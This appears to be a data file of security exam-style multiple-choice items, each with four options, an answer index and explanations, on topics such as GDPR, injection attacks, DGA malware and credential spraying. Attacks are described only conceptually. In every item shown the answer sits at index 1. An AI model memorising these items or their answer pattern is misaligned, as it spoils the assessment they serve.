  {id:486,domain:P,question:"What is the purpose of a data protection officer (DPO)?",options:["A role responsible for protecting the organization's proprietary business data, trade secrets, and intellectual property from competitive intelligence gathering and corporate espionage activities","An independent role required by GDPR for certain organizations, responsible for overseeing data protection compliance and serving as the point of contact with supervisory authorities","An IT operations role responsible for designing, scheduling, testing, and validating data backup procedures to ensure recovery time and recovery point objectives can be met","A specialized incident response investigator focused on examining confirmed data breaches, conducting forensic analysis, and determining the scope and root cause of unauthorized data access"],answer:1,explanation:"GDPR Article 37 requires DPOs for public authorities and organizations with large-scale personal data processing — they advise, monitor compliance, and liaise with data protection authorities.",optionExplanations:["Protecting data assets from competitors is a business intelligence and IP protection function; DPOs focus on personal data protection compliance and data subject rights under GDPR.","A DPO provides expert advice on data protection obligations, monitors compliance with GDPR, conducts DPIAs, and serves as the liaison with the supervisory authority (national data protection authority).","Data backup and recovery is an IT operations function; the DPO is a compliance oversight and advisory role that serves as the liaison with supervisory authorities.","Breach investigation may involve the DPO in a coordination capacity; the primary DPO role is ongoing compliance monitoring, advisory, and supervisory authority liaison, not forensic investigation."]},
  {id:487,domain:A,question:"What is network topology and why does it matter for security?",options:["The visual representation of network infrastructure using standardized icons, symbols, and line styles in diagramming tools to document the environment for administrators and architects","The arrangement of network elements and how they interconnect, which determines data flow paths, potential attack paths, and where security controls should be placed","The physical arrangement of network cables, conduits, patch panels, and structured wiring connecting network devices within a building or campus communications infrastructure","The physical organization and mounting arrangement of servers, switches, routers, and security appliances within standard equipment racks in a data center or network closet"],answer:1,explanation:"Security controls must be placed where they can inspect all relevant traffic — topology determines if a firewall actually sees traffic or if there are paths around it.",optionExplanations:["Network diagrams represent topology visually; topology itself is the actual physical and logical structure of connections and data flows that the diagram is meant to depict.","Network topology (bus, star, ring, mesh, tree) determines which systems can communicate directly, where traffic flows can be monitored, and where security controls must be deployed.","Physical cabling is one component of topology but captures only the physical layer; full network topology includes logical elements like VLANs, routing domains, and virtual overlay networks.","Rack organization is data center physical layout management; network topology describes logical interconnections, data flow paths, and the placement of controls regardless of physical arrangement."]},
  {id:488,domain:O,question:"What is continuous security monitoring (CSM)?",options:["Employing physical security guards working in rotating shifts around the clock to monitor server rooms, data centers, and network closets for unauthorized physical access","Ongoing, automated collection and analysis of security data to provide real-time visibility into organizational security posture and enable rapid threat detection","Scheduled monthly reviews of security system configurations, policy settings, access log summaries, and control effectiveness metrics conducted by the security operations or compliance team","Regularly scheduled authorized simulated attacks performed by security professionals to test and measure the effectiveness of technical defenses and the detection capabilities of the team"],answer:1,explanation:"CSM (NIST SP 800-137) implements automation to continuously collect metrics, perform change detection, and report security status — replacing periodic point-in-time assessments.",optionExplanations:["Security guards provide physical monitoring of facilities; CSM refers to automated technical monitoring of IT security controls, system configurations, network traffic, and security events.","CSM uses automated tools to continuously monitor network traffic, system configurations, user behavior, and security controls — providing ongoing visibility rather than periodic snapshots.","Monthly reviews are periodic point-in-time assessments; CSM is continuous and automated, providing near-real-time security status rather than periodic snapshots of security posture.","Penetration testing is periodic adversarial simulation producing point-in-time findings; CSM is continuous automated monitoring of security posture and control effectiveness over time."]},
  {id:489,domain:T,question:"What is an injection attack?",options:["Physically inserting hardware implants, modified storage media, or tampered firmware modules into computing systems to introduce malicious code directly at the hardware supply chain level","A class of attacks where malicious code or data is inserted into an interpreter (SQL, OS, LDAP, XML) as part of a command or query","Inserting crafted forged network packets into an existing TCP or UDP session to hijack connections or inject unauthorized commands between two communicating network systems","Using specialized post-exploitation frameworks to load and execute malicious shellcode or modules directly into the memory address space of a running process on a compromised system"],answer:1,explanation:"Injection attacks (SQL, command, LDAP, XPath, XML) exploit interpreters that incorrectly process untrusted data as executable code — prevented by parameterized queries and input validation.",optionExplanations:["Physical hardware attacks are supply chain or hardware tampering; injection attacks exploit software interpreters through application input, not physical access to hardware components.","Injection attacks exploit the boundary between data and code — when an interpreter processes attacker-supplied data as commands. SQL injection inserts SQL; command injection inserts OS commands.","Network packet injection manipulates network-layer communication streams; application injection attacks target the interpreters processing application-layer input such as SQL engines or OS command shells.","Process memory code injection is a post-exploitation technique for privilege escalation or evasion; injection attacks specifically target input interpreters processing attacker-supplied data as executable commands."]},
  {id:490,domain:G,question:"What is a security policy hierarchy?",options:["Organizing the information security department personnel into a tiered management structure ranked by each staff member's years of experience, technical certifications, and seniority","A layered structure of security documents with policies at the top (high-level), supported by standards, then procedures, then guidelines","A prioritized catalog of security controls ranked by their measured effectiveness, implementation cost, and risk reduction value relative to the organization's current threat profile","A defined escalation path specifying which security analysts, team leads, managers, and executives must be notified at each severity level during an active security incident"],answer:1,explanation:"Policies state what must be done; standards specify how; procedures give step-by-step instructions; guidelines offer best practice recommendations — each level provides increasing detail.",optionExplanations:["Personnel seniority hierarchy is organizational HR structure; security policy hierarchy is a documentation governance framework organizing policies, standards, procedures, and guidelines by authority level.","The policy hierarchy (Policy → Standard → Procedure → Guideline) provides different levels of specificity and binding authority — policies are mandatory; guidelines are advisory.","Security control prioritization is risk management and investment planning; the policy hierarchy organizes security documentation by binding authority and specificity, not control effectiveness or cost.","Escalation chains are incident response communication procedures; the security policy hierarchy organizes governance documentation from high-level mandatory policies down through specific advisory guidelines."]},
  {id:491,domain:T,question:"What is domain generation algorithm (DGA) malware?",options:["Malware that automatically registers large volumes of newly created domain names with legitimate registrars to use as distribution infrastructure for spam email or phishing campaigns","Malware that generates large numbers of domain names algorithmically for C2 communications, making it difficult to block by domain blocklist","Malware that routes all command-and-control traffic through trusted, legitimate cloud services and social media platforms to evade domain reputation filtering and network monitoring","A legitimate network administration utility used by IT teams to generate and resolve test domain names for DNS infrastructure load testing and service performance measurement"],answer:1,explanation:"DGA malware (Conficker, GameOver Zeus) generates hundreds of daily domains — defenders must sink-hole all possible domains while attackers only need to register one that isn't blocked.",optionExplanations:["Domain registration for spam uses static or bulk-registered domains; DGA malware generates pseudorandom domain names algorithmically so only the botmaster needs to register one from the list.","DGA-based malware and its C2 server use the same algorithm with the same seed to generate the same list of domains daily — the botmaster only needs to register one domain from the list for contact.","Using legitimate domains for C2 is domain fronting or dead drop resolvers; DGA malware specifically generates large numbers of pseudorandom domain names, not routing through legitimate services.","Network testing tools generate domains for operational purposes; DGA is a malware technique generating thousands of pseudorandom domains for resilient C2 infrastructure that evades blocklists."]},
  {id:492,domain:A,question:"What is a bastion host?",options:["A physically reinforced secure facility or vault constructed specifically to house server and network infrastructure with heavy blast protection, restricted entry, and armed security","A hardened, exposed server that sits on the network boundary, providing a single, secure entry point into a protected network","A centralized application server deployed within the DMZ to host all organizational security software including SIEM, vulnerability scanners, and endpoint detection management consoles","A secondary standby server maintained in hot or warm state to automatically take over processing responsibilities if a primary critical system fails or becomes unavailable"],answer:1,explanation:"Bastion hosts have minimal software, enhanced logging, strict access controls, and serve as the only authorized path into a secured network zone — like a jump server for administrative access.",optionExplanations:["Fortified data center facilities are secure physical infrastructure; a bastion host is a network-facing hardened server, not a building, that provides controlled entry to a protected network.","A bastion host is deliberately exposed to the internet but stripped down to only essential services with maximum hardening — all access to internal networks must pass through it for logging and control.","Centralized security application servers host security tooling; bastion hosts are hardened entry-point servers, not application servers, providing strictly controlled and logged network boundary access.","Failover standby servers provide high availability and redundancy; bastion hosts provide controlled and audited entry points to protected network segments, not redundancy for other systems."]},
  {id:493,domain:O,question:"What is a cyber threat intelligence (CTI) program?",options:["A formal organizational program for submitting detailed cybercrime reports, including technical indicators and attribution evidence, to FBI, CISA, or other law enforcement agencies","An organized function that collects, analyzes, and produces actionable intelligence about threat actors, their capabilities, and intentions to support defensive decisions","A structured repository of historical security incident records containing timelines, affected systems, attacker techniques, and remediation steps taken by the organization over time","A structured application security technique used during software design to systematically identify potential threats, attack surfaces, and mitigations for applications under development"],answer:1,explanation:"CTI programs analyze strategic intelligence (who is targeting us, why), operational intelligence (current campaigns), and tactical intelligence (IoCs, TTPs) to improve defenses.",optionExplanations:["Law enforcement reporting is an incident response obligation; CTI is an intelligence production function focused on generating actionable analysis of threats to support proactive defensive decisions.","CTI collects data from threat feeds, dark web monitoring, incident analysis, and OSINT, then produces intelligence that informs detection rules, defensive priorities, and risk assessment.","Incident databases are historical operational records; CTI produces forward-looking, analyzed intelligence about current and emerging threat actors, capabilities, and intentions to inform defenses.","Threat modeling is a software security design technique; CTI is an ongoing intelligence production program focused on external threat actor tracking, not application design security analysis."]},
  {id:494,domain:P,question:"What is a legitimate interest basis for processing personal data under GDPR?",options:["Any documented organizational justification, whether operational, financial, or strategic, that a controller provides to explain why it collects and processes personal data from individuals","A legal basis (GDPR Article 6(1)(f)) allowing processing when the controller's legitimate interests outweigh individual privacy interests, after conducting a three-part test","A legal principle stating that any data processing conducted primarily for a commercial or profit-generating purpose is automatically lawful under all applicable data protection regulations","A legal basis under GDPR Article 6(1)(e) that permits public authorities and government agencies to process citizen data when necessary to perform public interest tasks"],answer:1,explanation:"Legitimate interest requires: purpose test (is the interest legitimate?), necessity test (is processing needed?), and balancing test (do legitimate interests override individual rights?).",optionExplanations:["Not every business reason qualifies; legitimate interest under GDPR Article 6(1)(f) must pass a three-part test establishing the interest, necessity, and balance against individual rights.","Legitimate interest is one of six GDPR legal bases — it requires documenting the interest, demonstrating necessity, and balancing it against individuals' rights and reasonable expectations.","Commercial purposes do not automatically confer lawfulness; legitimate interest must be specifically assessed through the three-part test and documented in a legitimate interests assessment.","Public task is the Article 6(1)(e) basis for government processing; legitimate interest under Article 6(1)(f) is a separate basis applicable primarily to private sector controllers."]},
  {id:495,domain:G,question:"What is quantum cryptography and how does it differ from quantum-resistant cryptography?",options:["Quantum cryptography and quantum-resistant cryptography are interchangeable terms that both describe encryption approaches using quantum mechanical principles to secure data transmissions","Quantum cryptography uses quantum physics principles (QKD) for provably secure key exchange; quantum-resistant cryptography uses classical mathematical algorithms designed to resist quantum computer attacks","Quantum key distribution remains entirely theoretical with no practical implementations, while quantum-resistant algorithms are currently standardized by NIST and deployed in production environments","Post-quantum cryptographic algorithms require access to quantum computers to execute their mathematical computations, while quantum key distribution can operate on classical network hardware"],answer:1,explanation:"QKD (quantum key distribution) physically detects eavesdropping; post-quantum cryptography (CRYSTALS-Kyber, CRYSTALS-Dilithium) uses math problems quantum computers can't efficiently solve.",optionExplanations:["Quantum cryptography and quantum-resistant cryptography address fundamentally different problems; confusing them is a common error, as one uses quantum physics while the other avoids quantum threats.","Quantum cryptography (QKD) uses quantum mechanics to distribute keys — any eavesdropping disturbs quantum states and is detectable. Quantum-resistant (post-quantum) algorithms are classical math designed to be hard for quantum computers.","QKD is commercially deployed by vendors like ID Quantique and Toshiba; both approaches are real technologies, not theoretical, though quantum-resistant algorithms are more broadly accessible.","Quantum-resistant algorithms run entirely on classical computers and are designed to be safe even when adversaries have quantum computers; QKD uses quantum hardware for key distribution."]},
  {id:496,domain:T,question:"What is a ransomware-as-a-service (RaaS) model?",options:["A commercially licensed cloud-based platform provided to cybersecurity researchers and incident responders for safely detonating and analyzing ransomware samples in controlled isolated environments","A criminal business model where ransomware developers provide their tools and infrastructure to affiliates who conduct attacks and share the ransom proceeds","A commercial professional service offered by incident response firms to help organizations decrypt files, restore systems, and recover operations after suffering a ransomware attack","A classified government signals intelligence program that covertly monitors ransomware group communications and infrastructure to gather attribution data and disrupt operations before attacks occur"],answer:1,explanation:"RaaS (LockBit, BlackCat/ALPHV) lowers the barrier to ransomware attacks — affiliates don't need to develop malware, only conduct attacks — explaining the explosion of ransomware groups.",optionExplanations:["Legitimate ransomware analysis sandboxes help defenders study threats; RaaS is a criminal commercial model where ransomware developers sell tools and infrastructure to criminal affiliate attackers.","RaaS operates like legitimate SaaS — developers provide ransomware, infrastructure, and support; affiliates conduct attacks and receive 70-80% of ransom payments; developers receive the rest.","Ransomware recovery services help victims respond to incidents; RaaS is the criminal distribution model that enables affiliates to conduct ransomware attacks using pre-built criminal infrastructure.","Government cyber operations to disrupt ransomware exist but are law enforcement functions; RaaS is a criminal commercial service model enabling non-technical affiliates to conduct ransomware campaigns."]},
  {id:497,domain:A,question:"What is mutual authentication?",options:["Multiple end users simultaneously submitting login requests to the same application or system through concurrent parallel authentication sessions at exactly the same moment","A process where both parties in a communication session verify each other's identity, not just the server verifying the client","An access control mechanism requiring that two or more designated administrators must independently review, approve, and countersign before any privileged administrative operation is permitted","An authentication process where a user must provide different credential types in sequence, with each credential type verified and accepted before the next credential prompt appears"],answer:1,explanation:"Mutual TLS (mTLS) has both client and server present certificates — API security commonly requires mTLS to ensure only authorized systems can call APIs, not just anyone with credentials.",optionExplanations:["Simultaneous multi-user logins are concurrent session management; mutual authentication requires both communicating parties to verify each other's identity, not simultaneous logins by different users.","Mutual authentication prevents rogue servers — in standard HTTPS, only the server is authenticated; mTLS requires clients to also present certificates, enabling server-side client verification.","Dual-administrator approval is a form of separation of duties; mutual authentication is a protocol-level process where both parties in a communication session verify each other's identity.","Sequential multi-step credential entry describes step-up authentication or MFA; mutual authentication is bidirectional — both the client and server verify each other's identity during session establishment."]},
  {id:498,domain:O,question:"What is the NIST Cybersecurity Framework (CSF) core structure?",options:["Plan, Do, Check, Act — the four-stage continuous improvement cycle used in ISO 27001 information security management systems and quality management standard implementations","Identify, Protect, Detect, Respond, Recover — five functions organizing cybersecurity activities into a cohesive lifecycle","Prepare, Prevent, Detect, Contain, Eradicate — five phases commonly referenced in incident response and digital forensics methodology for systematically managing cybersecurity incidents","Govern, Identify, Protect, Detect, Respond, Recover — six functions introduced in the updated NIST Cybersecurity Framework version 2.0 published by NIST in February 2024"],answer:1,explanation:"NIST CSF 1.1's five functions provide a common language for cybersecurity risk management — CSF 2.0 adds Govern as a sixth function encompassing cybersecurity governance.",optionExplanations:["Plan-Do-Check-Act is the PDCA cycle used in ISO 27001 and ISO 9001 management systems; NIST CSF organizes cybersecurity activities into five distinct functions across a security lifecycle.","NIST CSF (version 1.1) organizes activities into Identify (asset management, risk assessment), Protect (access control, training), Detect (monitoring), Respond (response planning), and Recover (recovery planning).","Prepare-Prevent-Detect-Contain-Eradicate resembles incident response lifecycle phases; NIST CSF is a broader security program management framework, not a sequence of incident response steps.","Govern-Identify-Protect-Detect-Respond-Recover is the correct NIST CSF 2.0 structure; the original version 1.1 has five functions without the Govern function, which is what this question tests."]},
  {id:499,domain:T,question:"What is a trojanized software update?",options:["A poorly optimized software update that introduces performance regressions, increases resource consumption, or causes system slowdowns on devices after it is successfully applied","Legitimate software updates that have been compromised to deliver malware, exploiting users' trust in official update mechanisms","A software update package that requests excessive operating system permissions or resource privileges beyond what the application's stated functionality legitimately requires to operate","A mandatory software update automatically pushed to managed devices by vendor or MDM systems that users cannot decline, defer, or reschedule at their own convenience"],answer:1,explanation:"SolarWinds, Asus Live Update, and NotPetya (disguised as M.E.Doc accounting software) are examples of trojanized updates that compromise thousands of targets simultaneously.",optionExplanations:["Performance-degrading updates are quality defects or intentional design decisions; trojanized updates are specifically legitimate update packages compromised to deliver malware to trusting recipients.","Trojanized updates compromise the update distribution chain — developers, build systems, or update servers — so that legitimate users downloading and installing valid updates receive malware.","Excessive permission requests may indicate malicious behavior, but they are a static analysis indicator; trojanized updates specifically compromise the update distribution chain to deliver malware.","Forced automatic updates are a deployment policy mechanism; trojanized updates are specifically compromised legitimate update packages used to deliver malware through trusted update mechanisms."]},
  {id:500,domain:G,question:"What is the CIA triad?",options:["A classified security model developed by the Central Intelligence Agency defining operational compartmentalization protocols to protect sensitive intelligence sources and methods from exposure","Confidentiality, Integrity, and Availability — the three core principles guiding information security that all security controls aim to protect","A set of operational security practices and counterintelligence protocols used by the Central Intelligence Agency to protect classified programs, personnel, and agent identities","A three-level hierarchical information classification framework designating government information as Confidential, Secret, or Top Secret based on the damage that disclosure would cause"],answer:1,explanation:"Every security control maps to CIA: encryption preserves Confidentiality, checksums verify Integrity, redundancy ensures Availability — these three properties define information security.",optionExplanations:["CIA as an intelligence agency has its own security models; in information security, CIA is an acronym for Confidentiality, Integrity, and Availability — the three core security objectives.","The CIA triad defines information security objectives: Confidentiality (only authorized users access data), Integrity (data is accurate and unmodified), and Availability (systems and data are accessible when needed).","CIA operational security practices are intelligence community protocols; the CIA triad is an information security framework defining the three fundamental security properties all controls must protect.","Government information classification tiers use Confidential, Secret, and Top Secret levels; the CIA triad defines security properties — Confidentiality, Integrity, and Availability — not classification levels."]},
  {id:501,domain:O,question:"What is application whitelisting?",options:["A governance process in which an organization's IT or security team evaluates and approves specific web-based SaaS applications before employees are permitted to use them","A security control that allows only explicitly approved applications to run on a system, blocking all unauthorized software including malware","A curated procurement list of pre-vetted software vendors and publishers that have passed security review and are approved for organizational software purchasing decisions","A mail gateway security control that inspects inbound email attachments and blocks or quarantines messages containing file extensions associated with executable or script content"],answer:1,explanation:"Application whitelisting (Windows AppLocker, WDAC) is one of the most effective controls against malware — if malware isn't on the allowed list, it cannot execute regardless of how it arrives.",optionExplanations:["Web application approval is a governance and shadow IT control process; application whitelisting is a technical endpoint control preventing unauthorized executables from running on systems.","Application whitelisting maintains a list of approved executables, and the OS enforces that only listed applications can run — blocking all unknown software including zero-day malware.","Approved vendor lists are procurement governance tools; application whitelisting is a technical enforcement control on endpoints specifying exactly which executable files are permitted to run.","Email attachment filtering is a mail security gateway control; application whitelisting controls which executables can run on endpoint systems, preventing malware execution regardless of delivery method."]},
  {id:502,domain:T,question:"What is a business email compromise (BEC) attack?",options:["Gaining unauthorized access to an organization's email server infrastructure by exploiting application vulnerabilities, weak credentials, or misconfigured email authentication protocols","A sophisticated social engineering attack using impersonated or compromised business email accounts to authorize fraudulent financial transfers or data theft","Sending unsolicited bulk commercial email at high volume using a company's legitimate email domain to distribute advertising content, malware, or fraudulent messages to recipients","Delivering malicious executable files, macro-enabled documents, or archive files embedded with malware through targeted email attachments to compromise the recipient's endpoint systems"],answer:1,explanation:"BEC attacks (costing billions annually) impersonate executives (CEO fraud) or vendors, manipulating employees into wire transfers or payroll redirections.",optionExplanations:["Email server compromise may be a step in BEC but is not its definition; BEC is the social engineering fraud committed using impersonated or compromised business email accounts.","BEC attacks typically impersonate executives ('urgent wire transfer needed'), business partners, or legal counsel to convince employees to bypass normal financial controls.","Bulk spam using business domains is domain abuse; BEC is targeted fraud aimed at specific individuals in a company to authorize financial transfers, not broad-audience email spam.","Malware email delivery is phishing; BEC typically avoids malware and instead exploits human trust through impersonation and social engineering to authorize unauthorized financial transactions."]},
  {id:503,domain:A,question:"What is a demilitarized zone (DMZ) in the context of industrial control systems (ICS)?",options:["A physical buffer territory established between two hostile nation states or military forces under a ceasefire or armistice agreement to prevent direct armed confrontation","A network segment between corporate IT networks and operational technology (OT) networks that controls and monitors data flows between them","A network zone that has been intentionally left without security controls or traffic monitoring to allow unrestricted bidirectional communication between all connected devices and systems","An isolated staging environment used by industrial control engineers to safely test, validate, and configure new ICS software and hardware before deploying to production systems"],answer:1,explanation:"ICS DMZs prevent direct connectivity between business IT and critical OT networks — a jump server in the DMZ provides controlled, monitored access to OT systems.",optionExplanations:["Geographic military buffer zones are international security concepts; an ICS DMZ is a network security architecture segment isolating industrial control systems from corporate IT networks.","An OT/IT DMZ enforces data diode or firewall-controlled flows between corporate networks and industrial control systems, preventing IT security incidents from directly impacting OT operations.","DMZs have precisely defined security controls; they are the enforcement point between network segments, not a security-free zone, providing controlled and monitored data flow between OT and IT.","Testing environments validate changes before deployment; an ICS DMZ is a permanent production security architecture segment controlling and monitoring data flows between IT and OT networks."]},
  {id:504,domain:P,question:"What is cross-border data transfer regulation under GDPR?",options:["Postal and logistics regulations governing the physical transportation of paper records, printed documents, and storage media across international borders between countries","Restrictions on transferring personal data to countries outside the EU/EEA that don't provide adequate privacy protection, requiring safeguards like standard contractual clauses","Trade and customs regulations that apply to the import, export, and cross-border shipment of electronic equipment, computers, and networking hardware between countries","Technical and legal standards governing the physical connectivity and peering arrangements of international undersea cable systems, internet exchange points, and cross-border network links"],answer:1,explanation:"GDPR Chapter V restricts transfers to non-adequate countries — organizations use SCCs (Standard Contractual Clauses), BCRs, or adequacy decisions to enable lawful transfers.",optionExplanations:["Physical document transportation regulations are postal and customs law; GDPR cross-border rules govern electronic transfers of personal data to countries without adequate privacy protection.","GDPR prevents personal data from being sent to countries without equivalent protection — transfers require adequacy decisions (like UK, Japan), SCCs, BCRs, or other GDPR-approved mechanisms.","Device customs regulations are trade and import law; GDPR transfer restrictions are data protection legal requirements governing where personal data about EU residents may be processed.","Network interconnection standards are telecommunications infrastructure regulations; GDPR transfer restrictions are data protection legal requirements applied to personal data, not to network physical connectivity."]},
  {id:505,domain:G,question:"What is a rainbow table?",options:["A visual dashboard displaying color-coded security metrics, risk indicators, and compliance status using charts and graphs for executive briefings and security program reporting","A precomputed table of password hashes mapping hash values back to plaintext, enabling fast password cracking without computing hashes in real-time","An encryption scheme that applies multiple independent cipher transformations across several data dimensions simultaneously to increase the overall complexity and strength of the encryption","A reference table containing cryptographic key material organized by key identifier, algorithm type, and rotation schedule for use in key management infrastructure operations"],answer:1,explanation:"Rainbow tables enable fast reverse hash lookups — defeated by salting (adding unique random values to each password before hashing makes precomputation impractical).",optionExplanations:["Security metric dashboards are reporting tools using multiple colors; rainbow tables are precomputed hash-to-plaintext lookup structures used by attackers to crack password hashes rapidly.","A rainbow table precomputes hash→password mappings, allowing an attacker with stolen hashes to look up passwords instantly rather than computing hashes for each guess.","Multi-dimensional encryption describes layered cipher approaches; rainbow tables are specifically precomputed hash-to-plaintext lookup tables, not an encryption scheme or cipher construction.","Key management reference tables organize cryptographic keys; rainbow tables contain precomputed hash values mapped back to the plaintext passwords that produced them for fast password recovery."]},
  {id:506,domain:O,question:"What is the purpose of an emergency response plan?",options:["A comprehensive organizational continuity document addressing only natural disaster threat categories such as earthquakes, floods, hurricanes, and wildfires, excluding other disruptive event types","Documented procedures for responding to various emergency scenarios (natural disaster, cyberattack, power failure, pandemic) to minimize impact and enable rapid recovery","A detailed building-specific emergency egress document specifying evacuation routes, exit locations, assembly areas, floor warden assignments, and occupant headcount procedures for fire emergencies","A pre-defined communication protocol specifying how IT staff, management, and end users are notified and kept informed during system outages or significant service degradations"],answer:1,explanation:"Emergency response plans define roles, communication trees, decision authorities, and action steps for multiple scenarios — integrating with BCP and DRP for comprehensive resilience.",optionExplanations:["Natural disasters are one emergency category; emergency response plans cover all major disruptive events including cyberattacks, power failures, pandemics, and any other scenario requiring coordinated response.","Emergency response plans document who does what, who communicates with whom, who makes decisions, and the specific steps for each emergency type — enabling coordinated response under stress.","Fire evacuation plans are a physical safety subset of emergency response; the broader emergency response plan covers cyberattacks, power failures, pandemics, and all other disruptive scenarios.","IT outage communication plans are a subset of emergency response; the full plan covers all crisis types including decision authority, resource coordination, and recovery actions across all scenarios."]},
  {id:507,domain:T,question:"What is pharming?",options:["Cyberattacks specifically targeting agricultural infrastructure such as precision farming equipment, irrigation control systems, and food supply chain management software systems","Redirecting users to fraudulent websites without their knowledge by corrupting DNS settings or hosts files, making the attack transparent to the victim","Systematically collecting and aggregating personal information from social media platforms by scraping public profiles and relationship graphs for intelligence gathering or fraud enablement","Outsourcing cybercriminal operations by contracting specialized attack services, exploit development, and malicious infrastructure management to criminal organizations on underground marketplaces"],answer:1,explanation:"Unlike phishing, pharming doesn't require a malicious link — victims type the legitimate URL but DNS corruption or hosts file modification sends them to an attacker's site.",optionExplanations:["Agricultural infrastructure attacks are a critical infrastructure threat; pharming is a web-based attack redirecting users to fraudulent sites through DNS corruption or hosts file modification.","Pharming corrupts DNS resolution (DNS poisoning) or modifies local hosts files so that typing a legitimate domain resolves to an attacker's IP, serving a convincing fake site.","Social media data scraping is data harvesting for OSINT or fraud; pharming is a web redirection attack that corrupts DNS or hosts files so legitimate domains resolve to fraudulent sites.","Outsourcing criminal operations is crime-as-a-service; pharming is a specific technical attack on DNS resolution that silently redirects victim web requests to attacker-controlled fraudulent sites."]},
  {id:508,domain:A,question:"What is data masking?",options:["Concealing observable network traffic patterns using traffic padding, timing randomization, or cover traffic to prevent adversaries from performing traffic flow analysis attacks","Replacing real data with realistic but fictional data to protect sensitive information while maintaining its usability for testing, development, or analytics","Applying symmetric or asymmetric encryption algorithms to data before it is written to storage media to render the content unreadable to anyone without the decryption key","Irreversibly removing or generalizing all personally identifiable attributes from a dataset to ensure that no individual can be re-identified before the data is publicly released"],answer:1,explanation:"Data masking enables realistic development/testing with production-like data without exposing real PII or sensitive information — required for compliance in dev/test environments.",optionExplanations:["Network traffic pattern obfuscation is traffic analysis prevention; data masking transforms data field values to substitute real sensitive values with realistic but fictional replacement values.","Data masking substitutes real values (names, SSNs, credit card numbers) with plausible but fictitious equivalents — 'John Smith' becomes 'Mary Johnson' — preserving format while removing real PII.","Encryption makes data unreadable but retains the original value recoverable with a key; masking replaces real values with different realistic-looking fictional values that preserve format.","Anonymization permanently removes identifying information with the intent of irreversibility; masking can be reversible and creates datasets that look real but substitute fictitious values for PII."]},
  {id:509,domain:T,question:"What is a Denial-of-Service (DoS) attack's primary goal?",options:["Exfiltrating sensitive files, records, and intellectual property from a target system by exploiting application vulnerabilities or misconfigured storage access controls to extract data","Making a resource unavailable to legitimate users by overwhelming it with traffic or requests, exploiting vulnerabilities to crash it, or disrupting connectivity","Exploiting unpatched software vulnerabilities, stolen credentials, or misconfigured access controls to breach security perimeters and gain unauthorized interactive access to systems or accounts","Positioning an attacker between two communicating parties to eavesdrop on, record, or modify network traffic without authorization, targeting confidentiality and message integrity"],answer:1,explanation:"DoS attacks target availability — the 'A' in CIA triad. Success is measured by downtime duration and impact on business operations and reputation.",optionExplanations:["Data exfiltration is a confidentiality attack targeting data theft; DoS attacks target availability by denying service to legitimate users without necessarily gaining access to or stealing data.","DoS attacks deny service — flooding network links, exhausting server resources, exploiting bugs that crash services, or corrupting data — all with the goal of preventing legitimate access.","Gaining unauthorized access is an integrity and confidentiality attack enabling further compromise; DoS attacks target availability by disrupting service to legitimate users without requiring system access.","Communication interception is a man-in-the-middle attack targeting confidentiality; DoS attacks target availability by making resources unreachable rather than intercepting or stealing communications."]},
  {id:510,domain:G,question:"What is cryptanalysis?",options:["An academic discipline focused on reviewing and summarizing published cryptography research papers, textbooks, and conference proceedings to teach students the mathematical history of ciphers","The study and practice of analyzing cryptographic systems to find weaknesses and recover plaintext without the key","The field of applied cryptography concerned with designing, mathematically proving security properties of, and standardizing new encryption algorithms, hash functions, and protocols","A malware reverse engineering technique that analyzes obfuscated or packed malicious executable samples to understand their behavior, payloads, and command infrastructure"],answer:1,explanation:"Cryptanalysis attacks include brute force, differential cryptanalysis, linear cryptanalysis, birthday attacks, and side-channel attacks — all aimed at defeating cryptographic security.",optionExplanations:["Academic study of cryptography literature is cryptology education; cryptanalysis is an active discipline of breaking or finding exploitable weaknesses in real cryptographic systems and implementations.","Cryptanalysis studies mathematical properties, implementation flaws, and physical side-channels to find faster-than-brute-force methods to defeat cryptography.","Creating new algorithms is the design side of cryptography; cryptanalysis specifically evaluates and attempts to break existing cryptographic systems through mathematical and implementation analysis.","Malware analysis is threat intelligence and incident response work; cryptanalysis focuses on finding mathematical or implementation weaknesses in cryptographic algorithms to defeat encryption without the key."]},
  {id:511,domain:O,question:"What is a security information sharing community's purpose?",options:["Establishing formal personnel exchange and staff rotation programs between organizations to share cybersecurity talent and specialized expertise across organizational and sector boundaries","Enabling organizations within the same sector to share threat intelligence, IoCs, and best practices to improve collective defensive capabilities","An online discussion forum, professional conference series, or certification association where cybersecurity practitioners network, share research presentations, and exchange career development resources","A government-administered program that collects and distributes classified threat intelligence derived from signals intelligence and law enforcement sources to vetted private sector recipients"],answer:1,explanation:"ISACs (Information Sharing and Analysis Centers), ISAO, and private threat sharing communities help defenders benefit from each other's experiences before they're targeted.",optionExplanations:["Staff sharing programs are HR and talent collaboration arrangements; security information sharing communities exchange threat intelligence, IoCs, and defensive best practices for collective security improvement.","Information sharing communities (FS-ISAC, H-ISAC, MS-ISAC) distribute anonymized threat intelligence — if a bank detects a new attack pattern, sharing it helps other banks defend before being hit.","Professional networking forums are community and education platforms; ISACs and similar sharing communities are operational threat intelligence exchange mechanisms with direct defensive application value.","Government intelligence sharing programs like InfraGard exist; the broader information sharing ecosystem includes ISACs and private sector sharing without requiring government involvement or security clearances."]},
  {id:512,domain:T,question:"What is credential spraying?",options:["Using a compromised set of stolen credentials to authenticate sequentially to multiple different systems and services across an organization in order to expand attacker access","An attack using a small number of common passwords against many accounts to avoid lockout thresholds, rather than testing many passwords against one account","Intercepting and capturing authentication credential hashes transmitted over wireless networks by performing passive monitoring of WPA Enterprise RADIUS authentication exchanges","A SQL injection variant that inserts stolen username and password values directly into database authentication query strings to bypass application-layer login form validation"],answer:1,explanation:"Credential spraying avoids account lockouts — instead of 100 attempts on one account (which locks it), try 'Password1!' across 100 different accounts.",optionExplanations:["Using stolen credentials across multiple systems is lateral movement using credential reuse; spraying inverts the brute-force approach by trying few passwords against many different accounts.","Credential spraying inverts the brute force approach — it tries one or few passwords (common ones like 'Spring2024!') against all accounts, staying under lockout thresholds while covering maximum accounts.","Wireless credential capture is a network-level attack; credential spraying is an authentication attack pattern testing a small number of common passwords across many accounts to avoid lockout.","SQL injection using credential data is an application injection attack; credential spraying is an authentication brute-force technique testing common passwords across many accounts at low per-account frequency."]},
